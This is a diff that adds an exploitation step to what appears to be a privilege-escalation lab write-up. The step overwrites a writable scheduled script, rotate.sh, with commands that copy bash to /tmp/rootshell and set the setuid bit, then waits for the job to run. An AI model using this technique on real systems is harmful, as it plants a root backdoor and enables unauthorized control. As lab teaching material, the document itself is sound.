@@ -198,3 +198,15 @@ Confirmation checks:
 
 Exploitation:
 
+Overwrite the rotate.sh file with:
+```
+cat > /opt/lab/scripts/rotate.sh <<'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootshell && chmod u+s /tmp/rootshell
+EOF
+```
+Wait 5 min then:
+
+<img width="659" height="84" alt="image" src="https://github.com/user-attachments/assets/363cf378-83a9-41aa-b194-20f424a1180c" />
+
+Clean up the lab in the same manner as V1.
